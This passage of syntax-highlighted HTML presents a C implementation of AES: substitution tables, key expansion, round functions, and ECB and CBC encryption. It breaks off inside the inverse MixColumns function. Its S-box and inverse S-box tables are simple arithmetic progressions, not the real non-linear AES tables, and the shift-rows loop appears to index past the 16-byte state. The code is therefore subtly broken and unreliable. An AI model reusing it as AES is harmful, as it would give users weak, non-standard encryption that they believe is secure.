<span class="number">0xF4</span>, <span class="number">0x0B</span>, <span class="number">0x22</span>, <span class="number">0x39</span>, <span class="number">0x50</span>, <span class="number">0x67</span>, <span class="number">0x7E</span>, <span class="number">0x95</span>, <span class="number">0xAC</span>, <span class="number">0xC3</span>, <span class="number">0xDA</span>, <span class="number">0xF1</span>, <span class="number">0x08</span>, <span class="number">0x1F</span>, <span class="number">0x36</span>, <span class="number">0x4D</span>, <span class="number">0x64</span>, <span class="number">0x7B</span>, <span class="number">0x92</span>, <span class="number">0xA9</span>, <span class="number">0xC0</span>, <span class="number">0xD7</span>, <span class="number">0xEE</span>, <span class="number">0x05</span>, <span class="number">0x1C</span>, <span class="number">0x33</span>, <span class="number">0x4A</span>, <span class="number">0x61</span>, <span class="number">0x78</span>, <span class="number">0x8F</span>, <span class="number">0xA6</span>, <span class="number">0xBD</span>, <span class="number">0xD4</span>, <span class="number">0xEB</span>, <span class="number">0x02</span>, <span class="number">0x19</span>, <span class="number">0x30</span>, <span class="number">0x47</span>, <span class="number">0x5E</span>, <span class="number">0x75</span>, <span class="number">0x8C</span>, <span class="number">0xA3</span>, <span class="number">0xBA</span>, <span class="number">0xD1</span>, <span class="number">0xE8</span>, <span class="number">0xFF</span>, <span class="number">0x16</span>, <span class="number">0x2D</span>, <span class="number">0x44</span>, <span class="number">0x5B</span>, <span class="number">0x72</span>, <span class="number">0x89</span>, <span class="number">0xA0</span>, <span class="number">0xB7</span>, <span class="number">0xCE</span>, <span class="number">0xE5</span>, <span class="number">0xFC</span>, <span class="number">0x13</span>, <span class="number">0x2A</span>, <span class="number">0x41</span>, <span class="number">0x58</span>, <span class="number">0x6F</span>, <span class="number">0x86</span>, <span class="number">0x9D</span>, <span class="number">0xB4</span>, <span class="number">0xCB</span>, <span class="number">0xE2</span>, <span class="number">0xF9</span>, <span class="number">0x10</span>, <span class="number">0x27</span>, <span class="number">0x3E</span>, <span class="number">0x55</span>, <span class="number">0x6C</span>, <span class="number">0x83</span>, <span class="number">0x9A</span>, <span class="number">0xB1</span>, <span class="number">0xC8</span>, <span class="number">0xDF</span>, <span class="number">0xF6</span>, <span class="number">0x0D</span>, <span class="number">0x24</span>, <span class="number">0x3B</span>, <span class="number">0x52</span>, <span class="number">0x69</span>, <span class="number">0x80</span>, <span class="number">0x97</span>, <span class="number">0xAE</span>, <span class="number">0xC5</span>, <span class="number">0xDC</span>, <span class="number">0xF3</span>, <span class="number">0x0A</span>, <span class="number">0x21</span>, <span class="number">0x38</span>, <span class="number">0x4F</span>, <span class="number">0x66</span>, <span class="number">0x7D</span>, <span class="number">0x94</span>, <span class="number">0xAB</span>, <span class="number">0xC2</span>, <span class="number">0xD9</span>, <span class="number">0xF0</span>, <span class="number">0x07</span>, <span class="number">0x1E</span>, <span class="number">0x35</span>, <span class="number">0x4C</span>, <span class="number">0x63</span>, <span class="number">0x7A</span>, <span class="number">0x91</span>, <span class="number">0xA8</span>, <span class="number">0xBF</span>, <span class="number">0xD6</span>, <span class="number">0xED</span>, <span class="number">0x04</span>, <span class="number">0x1B</span>, <span class="number">0x32</span>, <span class="number">0x49</span>, <span class="number">0x60</span>, <span class="number">0x77</span>, <span class="number">0x8E</span>, <span class="number">0xA5</span>, <span class="number">0xBC</span>, <span class="number">0xD3</span>, <span class="number">0xEA</span>, <span class="number">0x01</span>, <span class="number">0x18</span>, <span class="number">0x2F</span>, <span class="number">0x46</span>, <span class="number">0x5D</span>, <span class="number">0x74</span>, <span class="number">0x8B</span>, <span class="number">0xA2</span>, <span class="number">0xB9</span>, <span class="number">0xD0</span>, <span class="number">0xE7</span>, <span class="number">0xFE</span>, <span class="number">0x15</span>, <span class="number">0x2C</span>, <span class="number">0x43</span>, <span class="number">0x5A</span>, <span class="number">0x71</span>, <span class="number">0x88</span>, <span class="number">0x9F</span>, <span class="number">0xB6</span>, <span class="number">0xCD</span>, <span class="number">0xE4</span>, <span class="number">0xFB</span>, <span class="number">0x12</span></span><br><span class="line">&#125;;</span><br><span class="line">static const uint8_t g_inv_sbox[<span class="number">256</span>] = &#123;</span><br><span class="line">    /* <span class="number">0</span>     <span class="number">1</span>     <span class="number">2</span>     <span class="number">3</span>     <span class="number">4</span>     <span class="number">5</span>     <span class="number">6</span>     <span class="number">7</span>     <span class="number">8</span>     <span class="number">9</span>     A     B     C     D     E     F  */</span><br><span class="line">    <span class="number">65</span>,<span class="number">232</span>,<span class="number">143</span>,<span class="number">54</span>,<span class="number">221</span>,<span class="number">132</span>,<span class="number">43</span>,<span class="number">210</span>,<span class="number">121</span>,<span class="number">32</span>,<span class="number">199</span>,<span class="number">110</span>,<span class="number">21</span>,<span class="number">188</span>,<span class="number">99</span>,<span class="number">10</span>,<span class="number">177</span>,<span class="number">88</span>,<span class="number">255</span>,<span class="number">166</span>,<span class="number">77</span>,<span class="number">244</span>,<span class="number">155</span>,<span class="number">66</span>,<span class="number">233</span>,<span class="number">144</span>,<span class="number">55</span>,<span class="number">222</span>,<span class="number">133</span>,<span class="number">44</span>,<span class="number">211</span>,<span class="number">122</span>,<span class="number">33</span>,<span class="number">200</span>,<span class="number">111</span>,<span class="number">22</span>,<span class="number">189</span>,<span class="number">100</span>,<span class="number">11</span>,<span class="number">178</span>,<span class="number">89</span>,<span class="number">0</span>,<span class="number">167</span>,<span class="number">78</span>,<span class="number">245</span>,<span class="number">156</span>,<span class="number">67</span>,<span class="number">234</span>,<span class="number">145</span>,<span class="number">56</span>,<span class="number">223</span>,<span class="number">134</span>,<span class="number">45</span>,<span class="number">212</span>,<span class="number">123</span>,<span class="number">34</span>,<span class="number">201</span>,<span class="number">112</span>,<span class="number">23</span>,<span class="number">190</span>,<span class="number">101</span>,<span class="number">12</span>,<span class="number">179</span>,<span class="number">90</span>,<span class="number">1</span>,<span class="number">168</span>,<span class="number">79</span>,<span class="number">246</span>,<span class="number">157</span>,<span class="number">68</span>,<span class="number">235</span>,<span class="number">146</span>,<span class="number">57</span>,<span class="number">224</span>,<span class="number">135</span>,<span class="number">46</span>,<span class="number">213</span>,<span class="number">124</span>,<span class="number">35</span>,<span class="number">202</span>,<span class="number">113</span>,<span class="number">24</span>,<span class="number">191</span>,<span class="number">102</span>,<span class="number">13</span>,<span class="number">180</span>,<span class="number">91</span>,<span class="number">2</span>,<span class="number">169</span>,<span class="number">80</span>,<span class="number">247</span>,<span class="number">158</span>,<span class="number">69</span>,<span class="number">236</span>,<span class="number">147</span>,<span class="number">58</span>,<span class="number">225</span>,<span class="number">136</span>,<span class="number">47</span>,<span class="number">214</span>,<span class="number">125</span>,<span class="number">36</span>,<span class="number">203</span>,<span class="number">114</span>,<span class="number">25</span>,<span class="number">192</span>,<span class="number">103</span>,<span class="number">14</span>,<span class="number">181</span>,<span class="number">92</span>,<span class="number">3</span>,<span class="number">170</span>,<span class="number">81</span>,<span class="number">248</span>,<span class="number">159</span>,<span class="number">70</span>,<span class="number">237</span>,<span class="number">148</span>,<span class="number">59</span>,<span class="number">226</span>,<span class="number">137</span>,<span class="number">48</span>,<span class="number">215</span>,<span class="number">126</span>,<span class="number">37</span>,<span class="number">204</span>,<span class="number">115</span>,<span class="number">26</span>,<span class="number">193</span>,<span class="number">104</span>,<span class="number">15</span>,<span class="number">182</span>,<span class="number">93</span>,<span class="number">4</span>,<span class="number">171</span>,<span class="number">82</span>,<span class="number">249</span>,<span class="number">160</span>,<span class="number">71</span>,<span class="number">238</span>,<span class="number">149</span>,<span class="number">60</span>,<span class="number">227</span>,<span class="number">138</span>,<span class="number">49</span>,<span class="number">216</span>,<span class="number">127</span>,<span class="number">38</span>,<span class="number">205</span>,<span class="number">116</span>,<span class="number">27</span>,<span class="number">194</span>,<span class="number">105</span>,<span class="number">16</span>,<span class="number">183</span>,<span class="number">94</span>,<span class="number">5</span>,<span class="number">172</span>,<span class="number">83</span>,<span class="number">250</span>,<span class="number">161</span>,<span class="number">72</span>,<span class="number">239</span>,<span class="number">150</span>,<span class="number">61</span>,<span class="number">228</span>,<span class="number">139</span>,<span class="number">50</span>,<span class="number">217</span>,<span class="number">128</span>,<span class="number">39</span>,<span class="number">206</span>,<span class="number">117</span>,<span class="number">28</span>,<span class="number">195</span>,<span class="number">106</span>,<span class="number">17</span>,<span class="number">184</span>,<span class="number">95</span>,<span class="number">6</span>,<span class="number">173</span>,<span class="number">84</span>,<span class="number">251</span>,<span class="number">162</span>,<span class="number">73</span>,<span class="number">240</span>,<span class="number">151</span>,<span class="number">62</span>,<span class="number">229</span>,<span class="number">140</span>,<span class="number">51</span>,<span class="number">218</span>,<span class="number">129</span>,<span class="number">40</span>,<span class="number">207</span>,<span class="number">118</span>,<span class="number">29</span>,<span class="number">196</span>,<span class="number">107</span>,<span class="number">18</span>,<span class="number">185</span>,<span class="number">96</span>,<span class="number">7</span>,<span class="number">174</span>,<span class="number">85</span>,<span class="number">252</span>,<span class="number">163</span>,<span class="number">74</span>,<span class="number">241</span>,<span class="number">152</span>,<span class="number">63</span>,<span class="number">230</span>,<span class="number">141</span>,<span class="number">52</span>,<span class="number">219</span>,<span class="number">130</span>,<span class="number">41</span>,<span class="number">208</span>,<span class="number">119</span>,<span class="number">30</span>,<span class="number">197</span>,<span class="number">108</span>,<span class="number">19</span>,<span class="number">186</span>,<span class="number">97</span>,<span class="number">8</span>,<span class="number">175</span>,<span class="number">86</span>,<span class="number">253</span>,<span class="number">164</span>,<span class="number">75</span>,<span class="number">242</span>,<span class="number">153</span>,<span class="number">64</span>,<span class="number">231</span>,<span class="number">142</span>,<span class="number">53</span>,<span class="number">220</span>,<span class="number">131</span>,<span class="number">42</span>,<span class="number">209</span>,<span class="number">120</span>,<span class="number">31</span>,<span class="number">198</span>,<span class="number">109</span>,<span class="number">20</span>,<span class="number">187</span>,<span class="number">98</span>,<span class="number">9</span>,<span class="number">176</span>,<span class="number">87</span>,<span class="number">254</span>,<span class="number">165</span>,<span class="number">76</span>,<span class="number">243</span>,<span class="number">154</span></span><br><span class="line">&#125;;</span><br><span class="line">/****************************************************************************************************************/</span><br><span class="line">uint8_t aes_sub_sbox(uint8_t val)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> g_aes_sbox[val];</span><br><span class="line">&#125;</span><br><span class="line">/****************************************************************************************************************/</span><br><span class="line">uint32_t aes_sub_dword(uint32_t val)</span><br><span class="line">&#123;</span><br><span class="line">    uint32_t tmp = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    tmp |= ((uint32_t)aes_sub_sbox((uint8_t)((val &gt;&gt; <span class="number">0</span>) &amp; <span class="number">0xFF</span>))) &lt;&lt; <span class="number">0</span>;</span><br><span class="line">    tmp |= ((uint32_t)aes_sub_sbox((uint8_t)((val &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>))) &lt;&lt; <span class="number">8</span>;</span><br><span class="line">    tmp |= ((uint32_t)aes_sub_sbox((uint8_t)((val &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>))) &lt;&lt; <span class="number">16</span>;</span><br><span class="line">    tmp |= ((uint32_t)aes_sub_sbox((uint8_t)((val &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>))) &lt;&lt; <span class="number">24</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tmp;</span><br><span class="line">&#125;</span><br><span class="line">/****************************************************************************************************************/</span><br><span class="line">uint32_t aes_rot_dword(uint32_t val)</span><br><span class="line">&#123;</span><br><span class="line">    uint32_t tmp = val;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (val &gt;&gt; <span class="number">8</span>) | ((tmp &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">24</span>);</span><br><span class="line">&#125;</span><br><span class="line">/****************************************************************************************************************/</span><br><span class="line">uint32_t aes_swap_dword(uint32_t val)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (((val &amp; <span class="number">0x000000FF</span>) &lt;&lt; <span class="number">24</span>) |</span><br><span class="line">        ((val &amp; <span class="number">0x0000FF00</span>) &lt;&lt; <span class="number">8</span>) |</span><br><span class="line">        ((val &amp; <span class="number">0x00FF0000</span>) &gt;&gt; <span class="number">8</span>) |</span><br><span class="line">        ((val &amp; <span class="number">0xFF000000</span>) &gt;&gt; <span class="number">24</span>));</span><br><span class="line">&#125;</span><br><span class="line">/****************************************************************************************************************/</span><br><span class="line">/*</span><br><span class="line">* nr: number of rounds</span><br><span class="line">* nb: number of columns comprising the state, nb = <span class="number">4</span> dwords (<span class="number">16</span> <span class="built_in">bytes</span>)</span><br><span class="line">* nk: number of <span class="number">32</span>-bit words comprising cipher key, nk = <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span> (KeyLength/(<span class="number">4</span>*<span class="number">8</span>))</span><br><span class="line">*/</span><br><span class="line">void aes_key_expansion(AES_CYPHER_T mode, uint8_t *key, uint8_t *<span class="built_in">round</span>)</span><br><span class="line">&#123;</span><br><span class="line">    uint32_t *w = (uint32_t *)<span class="built_in">round</span>;</span><br><span class="line">    uint32_t  t;</span><br><span class="line">    <span class="built_in">int</span>      i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    do &#123;</span><br><span class="line">        w[i] = *((uint32_t *)&amp;key[i * <span class="number">4</span> + <span class="number">0</span>]);</span><br><span class="line">    &#125; <span class="keyword">while</span> (++i &lt; g_aes_nk[mode]);</span><br><span class="line"></span><br><span class="line">    do &#123;</span><br><span class="line">        <span class="keyword">if</span> ((i % g_aes_nk[mode]) == <span class="number">0</span>) &#123;</span><br><span class="line">            t = aes_rot_dword(w[i - <span class="number">1</span>]);</span><br><span class="line">            t = aes_sub_dword(t);</span><br><span class="line">            t = t ^ aes_swap_dword(g_aes_rcon[i / g_aes_nk[mode] - <span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (g_aes_nk[mode] &gt; <span class="number">6</span> &amp;&amp; (i % g_aes_nk[mode]) == <span class="number">4</span>) &#123;</span><br><span class="line">            t = aes_sub_dword(w[i - <span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            t = w[i - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        w[i] = w[i - g_aes_nk[mode]] ^ t;</span><br><span class="line">    &#125; <span class="keyword">while</span> (++i &lt; g_aes_nb[mode] * (g_aes_rounds[mode] + <span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line">/****************************************************************************************************************/</span><br><span class="line">void aes_add_round_key(AES_CYPHER_T mode, uint8_t *state,</span><br><span class="line">    uint8_t *<span class="built_in">round</span>, <span class="built_in">int</span> nr)</span><br><span class="line">&#123;</span><br><span class="line">    uint32_t *w = (uint32_t *)<span class="built_in">round</span>;</span><br><span class="line">    uint32_t *s = (uint32_t *)state;</span><br><span class="line">    <span class="built_in">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; g_aes_nb[mode]; i++) &#123;</span><br><span class="line">        s[i] ^= w[nr * g_aes_nb[mode] + i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">/****************************************************************************************************************/</span><br><span class="line">void aes_sub_bytes(AES_CYPHER_T mode, uint8_t *state)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">int</span> i, j;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; g_aes_nb[mode]; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            state[i * <span class="number">4</span> + j] = aes_sub_sbox(state[i * <span class="number">4</span> + j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">/****************************************************************************************************************/</span><br><span class="line">void aes_shift_rows(AES_CYPHER_T mode, uint8_t *state)</span><br><span class="line">&#123;</span><br><span class="line">    uint8_t *s = (uint8_t *)state;</span><br><span class="line">    <span class="built_in">int</span> i, j, r;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; g_aes_nb[mode]; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">            uint8_t tmp = s[i];</span><br><span class="line">            <span class="keyword">for</span> (r = <span class="number">0</span>; r &lt; g_aes_nb[mode]; r++) &#123;</span><br><span class="line">                s[i + r * <span class="number">4</span>] = s[i + (r + <span class="number">1</span>) * <span class="number">4</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            s[i + (g_aes_nb[mode] - <span class="number">1</span>) * <span class="number">4</span>] = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">/****************************************************************************************************************/</span><br><span class="line">uint8_t aes_xtime(uint8_t x)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> ((x &lt;&lt; <span class="number">1</span>) ^ (((x &gt;&gt; <span class="number">7</span>) &amp; <span class="number">1</span>) * <span class="number">0x1b</span>));</span><br><span class="line">&#125;</span><br><span class="line">/****************************************************************************************************************/</span><br><span class="line">uint8_t aes_xtimes(uint8_t x, <span class="built_in">int</span> ts)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span> (ts-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        x = aes_xtime(x);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line">/****************************************************************************************************************/</span><br><span class="line">uint8_t aes_mul(uint8_t x, uint8_t y)</span><br><span class="line">&#123;</span><br><span class="line">    /*</span><br><span class="line">    * encrypt: y has only <span class="number">2</span> bits: can be <span class="number">1</span>, <span class="number">2</span> <span class="keyword">or</span> <span class="number">3</span></span><br><span class="line">    * decrypt: y could be <span class="built_in">any</span> value of <span class="number">9</span>, b, d, <span class="keyword">or</span> e</span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ((((y &gt;&gt; <span class="number">0</span>) &amp; <span class="number">1</span>) * aes_xtimes(x, <span class="number">0</span>)) ^</span><br><span class="line">        (((y &gt;&gt; <span class="number">1</span>) &amp; <span class="number">1</span>) * aes_xtimes(x, <span class="number">1</span>)) ^</span><br><span class="line">        (((y &gt;&gt; <span class="number">2</span>) &amp; <span class="number">1</span>) * aes_xtimes(x, <span class="number">2</span>)) ^</span><br><span class="line">        (((y &gt;&gt; <span class="number">3</span>) &amp; <span class="number">1</span>) * aes_xtimes(x, <span class="number">3</span>)) ^</span><br><span class="line">        (((y &gt;&gt; <span class="number">4</span>) &amp; <span class="number">1</span>) * aes_xtimes(x, <span class="number">4</span>)) ^</span><br><span class="line">        (((y &gt;&gt; <span class="number">5</span>) &amp; <span class="number">1</span>) * aes_xtimes(x, <span class="number">5</span>)) ^</span><br><span class="line">        (((y &gt;&gt; <span class="number">6</span>) &amp; <span class="number">1</span>) * aes_xtimes(x, <span class="number">6</span>)) ^</span><br><span class="line">        (((y &gt;&gt; <span class="number">7</span>) &amp; <span class="number">1</span>) * aes_xtimes(x, <span class="number">7</span>)));</span><br><span class="line">&#125;</span><br><span class="line">/****************************************************************************************************************/</span><br><span class="line">void aes_mix_columns(AES_CYPHER_T mode, uint8_t *state)</span><br><span class="line">&#123;</span><br><span class="line">    uint8_t y[<span class="number">16</span>] = &#123; <span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>,  <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>,  <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>,  <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span> &#125;;</span><br><span class="line">    uint8_t s[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">int</span> i, j, r;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; g_aes_nb[mode]; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (r = <span class="number">0</span>; r &lt; <span class="number">4</span>; r++) &#123;</span><br><span class="line">            s[r] = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">                s[r] = s[r] ^ aes_mul(state[i * <span class="number">4</span> + j], y[r * <span class="number">4</span> + j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (r = <span class="number">0</span>; r &lt; <span class="number">4</span>; r++) &#123;</span><br><span class="line">            state[i * <span class="number">4</span> + r] = s[r];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">/****************************************************************************************************************/</span><br><span class="line"><span class="built_in">int</span> aes_encrypt(AES_CYPHER_T mode, uint8_t *data, <span class="built_in">int</span> <span class="built_in">len</span>, uint8_t *key)</span><br><span class="line">&#123;</span><br><span class="line">    uint8_t w[<span class="number">4</span> * <span class="number">4</span> * <span class="number">15</span>] = &#123; <span class="number">0</span> &#125;; /* <span class="built_in">round</span> key */</span><br><span class="line">    uint8_t s[<span class="number">4</span> * <span class="number">4</span>] = &#123; <span class="number">0</span> &#125;; /* state */</span><br><span class="line"></span><br><span class="line">    <span class="built_in">int</span> nr, i, j;</span><br><span class="line"></span><br><span class="line">    /* key expansion */</span><br><span class="line">    aes_key_expansion(mode, key, w);</span><br><span class="line"></span><br><span class="line">    /* start data cypher loop over <span class="built_in">input</span> buffer */</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="built_in">len</span>; i += <span class="number">4</span> * g_aes_nb[mode]) &#123;</span><br><span class="line"></span><br><span class="line">        /* init state <span class="keyword">from</span> user buffer (plaintext) */</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span> * g_aes_nb[mode]; j++)</span><br><span class="line">            s[j] = data[i + j];</span><br><span class="line"></span><br><span class="line">        /* start AES cypher loop over <span class="built_in">all</span> AES rounds */</span><br><span class="line">        <span class="keyword">for</span> (nr = <span class="number">0</span>; nr &lt;= g_aes_rounds[mode]; nr++) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (nr &gt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">                /* do SubBytes */</span><br><span class="line">                aes_sub_bytes(mode, s);</span><br><span class="line"></span><br><span class="line">                /* do ShiftRows */</span><br><span class="line">                aes_shift_rows(mode, s);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (nr &lt; g_aes_rounds[mode]) &#123;</span><br><span class="line">                    /* do MixColumns */</span><br><span class="line">                    aes_mix_columns(mode, s);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            /* do AddRoundKey */</span><br><span class="line">            aes_add_round_key(mode, s, w, nr);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        /* save state (cypher) to user buffer */</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span> * g_aes_nb[mode]; j++)</span><br><span class="line">            data[i + j] = s[j];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">/****************************************************************************************************************/</span><br><span class="line"><span class="built_in">int</span> aes_encrypt_ecb(AES_CYPHER_T mode, uint8_t *data, <span class="built_in">int</span> <span class="built_in">len</span>, uint8_t *key)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> aes_encrypt(mode, data, <span class="built_in">len</span>, key);</span><br><span class="line">&#125;</span><br><span class="line">/****************************************************************************************************************/</span><br><span class="line"><span class="built_in">int</span> aes_encrypt_cbc(AES_CYPHER_T mode, uint8_t *data, <span class="built_in">int</span> <span class="built_in">len</span>, uint8_t *key, uint8_t *iv)</span><br><span class="line">&#123;</span><br><span class="line">    uint8_t w[<span class="number">4</span> * <span class="number">4</span> * <span class="number">15</span>] = &#123; <span class="number">0</span> &#125;; /* <span class="built_in">round</span> key */</span><br><span class="line">    uint8_t s[<span class="number">4</span> * <span class="number">4</span>] = &#123; <span class="number">0</span> &#125;; /* state */</span><br><span class="line">    uint8_t v[<span class="number">4</span> * <span class="number">4</span>] = &#123; <span class="number">0</span> &#125;; /* iv */</span><br><span class="line"></span><br><span class="line">    <span class="built_in">int</span> nr, i, j;</span><br><span class="line"></span><br><span class="line">    /* key expansion */</span><br><span class="line">    aes_key_expansion(mode, key, w);</span><br><span class="line"></span><br><span class="line">    memcpy(v, iv, sizeof(v));</span><br><span class="line"></span><br><span class="line">    /* start data cypher loop over <span class="built_in">input</span> buffer */</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="built_in">len</span>; i += <span class="number">4</span> * g_aes_nb[mode]) &#123;</span><br><span class="line"></span><br><span class="line">        /* init state <span class="keyword">from</span> user buffer (plaintext) */</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span> * g_aes_nb[mode]; j++)</span><br><span class="line">            s[j] = data[i + j] ^ v[j];</span><br><span class="line"></span><br><span class="line">        /* start AES cypher loop over <span class="built_in">all</span> AES rounds */</span><br><span class="line">        <span class="keyword">for</span> (nr = <span class="number">0</span>; nr &lt;= g_aes_rounds[mode]; nr++) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (nr &gt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">                /* do SubBytes */</span><br><span class="line">                aes_sub_bytes(mode, s);</span><br><span class="line"></span><br><span class="line">                /* do ShiftRows */</span><br><span class="line">                aes_shift_rows(mode, s);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (nr &lt; g_aes_rounds[mode]) &#123;</span><br><span class="line">                    /* do MixColumns */</span><br><span class="line">                    aes_mix_columns(mode, s);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            /* do AddRoundKey */</span><br><span class="line">            aes_add_round_key(mode, s, w, nr);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        /* save state (cypher) to user buffer */</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span> * g_aes_nb[mode]; j++)</span><br><span class="line">            data[i + j] = v[j] = s[j];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">/****************************************************************************************************************/</span><br><span class="line">void inv_shift_rows(AES_CYPHER_T mode, uint8_t *state)</span><br><span class="line">&#123;</span><br><span class="line">    uint8_t *s = (uint8_t *)state;</span><br><span class="line">    <span class="built_in">int</span> i, j, r;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; g_aes_nb[mode]; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; g_aes_nb[mode] - i; j++) &#123;</span><br><span class="line">            uint8_t tmp = s[i];</span><br><span class="line">            <span class="keyword">for</span> (r = <span class="number">0</span>; r &lt; g_aes_nb[mode]; r++) &#123;</span><br><span class="line">                s[i + r * <span class="number">4</span>] = s[i + (r + <span class="number">1</span>) * <span class="number">4</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            s[i + (g_aes_nb[mode] - <span class="number">1</span>) * <span class="number">4</span>] = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">/****************************************************************************************************************/</span><br><span class="line">uint8_t inv_sub_sbox(uint8_t val)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> g_inv_sbox[val];</span><br><span class="line">&#125;</span><br><span class="line">/****************************************************************************************************************/</span><br><span class="line">void inv_sub_bytes(AES_CYPHER_T mode, uint8_t *state)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">int</span> i, j;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; g_aes_nb[mode]; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            state[i * <span class="number">4</span> + j] = inv_sub_sbox(state[i * <span class="number">4</span> + j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">/****************************************************************************************************************/</span><br><span class="line">void inv_mix_columns(AES_CYPHER_T mode, uint8_t *state)</span><br><span class="line">&#123;</span><br><span class="line">    uint8_t y[<span class="number">16</span>] = &#123; <span class="number">0x0e</span>, <span class="number">0x0b</span>, <span class="number">0x0d</span>, <span class="number">0x09</span>,  <span class="number">0x09</span>, <span class="number">0x0e</span>, <span class="number">0x0b</span>, <span class="number">0x0d</span>,</span><br><span class="line">        <span class="number">0x0d</span>, <span class="number">0x09</span>, <span class="number">0x0e</span>, <span class="number">0x0b</span>,  <span class="number">0x0b</span>, <span class="number">0x0d</span>, <span class="number">0x09</span>, <span class="number">0x0e</span> &#125;;</span><br><span class="line">    uint8_t s[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">int</span> i, j, r;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; g_aes_nb[mode]; i++) 